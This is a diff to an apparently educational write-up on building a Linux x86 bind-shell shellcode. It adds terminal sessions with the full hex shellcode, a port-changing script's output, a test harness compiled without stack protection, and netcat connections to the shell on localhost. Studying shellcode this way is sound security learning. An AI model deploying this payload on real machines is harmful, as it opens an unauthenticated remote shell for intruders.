@@ -65,15 +65,6 @@ int main()
 }
 ```
 
-Before starting, a list of linux x86 systemcall can be found in the following files
-```console
-#cat /usr/include/asm/unistd_32.h
-```
-On older distributions the file is stored here:
-```console
-#cat /usr/include/i386-linux-gnu/asm/unistd_32.h 
-```
-
 Now, let's get to work.
 =
 
@@ -277,19 +268,27 @@ _start:
 
 Let's compile and execute it: 
 ```console
-#nasm -f elf32 -o bind_shell.o bind_shell.nasm
-#ld -m elf_i386 -z execstack -o bind_shell bind_shell.o
-#./bind_shell
+kali@kali:/tmp/$ nasm -f elf32 -o bind_shell.o bind_shell.nasm
+kali@kali:/tmp/$ ld -m elf_i386 -z execstack -o bind_shell bind_shell.o
+kali@kali:/tmp/$ ./bind_shell
 ```
 
 We can check if the port 4444 is open using netstat:
 ```console
-#netstat -antp | grep 4444
+kali@kali:/tmp$ netstat -antp | grep 4444
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+tcp        0      0 0.0.0.0:4444            0.0.0.0:*               LISTEN      1659/./bind_shell 
 ```
 
 We can now connect to this new port using for example netcat and get our shell:
 ```console
-#nc -nv 127.0.0.1 4444
+kali@kali:/tmp$ nc -nv 127.0.0.1 4444
+(UNKNOWN) [127.0.0.1] 4444 (?) open
+id
+uid=1000(kali) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),128(lpadmin),132(scanner)
+pwd
+/tmp
 ```
 
 # Second step: make the port configuration easy
@@ -300,8 +299,7 @@ Why ? Because our python script won't interpret our shellcode without this part.
 
 We can easily do that by using the following objdump command:
 ```console
-#objdump -d ./bind_shell |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
-
+kali@kali:/tmp$ objdump -d ./bind_shell |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
 "\\x89\\xe5\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\\xd2\\x50\\x50\\x50\\x66\\x68\\x11\\x5c\\x66\\x6a\\x02\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc7\\x31\\xc0\\x66\\xb8\\x69\\x01\\x89\\xfb\\x89\\xe1\\x89\\xea\\x29\\xe2\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6b\\x01\\x89\\xfb\\x31\\xc9\\xcd\\x80\\x31\\xc0\\x66\\xb8\\x6c\\x01\\x89\\xfb\\x31\\xc9\\x31\\xd2\\x31\\xf6\\xcd\\x80\\x89\\xc6\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xf3\\xfe\\xc9\\xcd\\x80\\xfe\\xc1\\xe2\\xf2\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\xb0\\x0b\\x89\\xe3\\x31\\xc9\\x31\\xd2\\xcd\\x80"
 ```
 
@@ -334,9 +332,9 @@ print(shellcode)
 
 This script will give us the following result:
 ```console
-#./modify_bind_shell.py 2222
-
-"\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x50\x50\x66\x68\x08\xae\x66\x6a\x02\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x69\x01\x89\xfb\x89\xe1\x89\xea\x29\xe2\xcd\x80\x31\xc0\x66\xb8\x6b\x01\x89\xfb\x31\xc9\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\x31\xf6\xcd\x80\x89\xc6\xb1\x03\x31\xc0\xb0\x3f\x89\xf3\xfe\xc9\xcd\x80\xfe\xc1\xe2\xf2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80"
+kali@kali:/tmp$ chmod +x modify_bind_shell.py 
+kali@kali:/tmp$ ./modify_bind_shell.py 2222
+\x89\xe5\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x50\x50\x66\x68\x08\xae\x66\x6a\x02\x66\xb8\x67\x01\xb3\x02\xb1\x01\xcd\x80\x89\xc7\x31\xc0\x66\xb8\x69\x01\x89\xfb\x89\xe1\x89\xea\x29\xe2\xcd\x80\x31\xc0\x66\xb8\x6b\x01\x89\xfb\x31\xc9\xcd\x80\x31\xc0\x66\xb8\x6c\x01\x89\xfb\x31\xc9\x31\xd2\xcd\x80\x31\xff\x89\xc7\xb1\x03\x31\xc0\xb0\x3f\x89\xfb\xfe\xc9\xcd\x80\xfe\xc1\xe2\xf2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80
 ```
 
 In order to test it, we can now used this return and add it to a C program which will execute our shellcode
@@ -363,17 +361,26 @@ main()
 
 Let's compile and execute this program:
 ```console
-#gcc test_shellcode.c -o test_shellcode -m32 -fno-stack-protector -z execstack 
-#./test_shellcode 
+kali@kali:/tmp$ gcc test_shellcode.c -o test_shellcode -m32 -fno-stack-protector -z execstack 
+kali@kali:/tmp$ ./test_shellcode 
 Shellcode Length:  117
+
 ```
 We can use netcat to check if the port 2222 is open:
 ```console
-#netstat -antp | grep 2222
+kali@kali:/tmp$ netstat -antp | grep 2222
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+tcp        0      0 0.0.0.0:2222            0.0.0.0:*               LISTEN      1738/./test_shellcode
 ```
 
-Finaly, netcat can be used to access our bind shell 
+Finaly, netcat can be used to access our bind shell:
 ```console
-#nc -nv 127.0.0.1 2222
+kali@kali:/tmp$ nc -nv 127.0.0.1 2222
+(UNKNOWN) [127.0.0.1] 2222 (?) open
+id
+uid=1000(kali) gid=1000(kali) groups=1000(kali),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),118(bluetooth),128(lpadmin),132(scanner)
+whoami
+kali
 ```
 
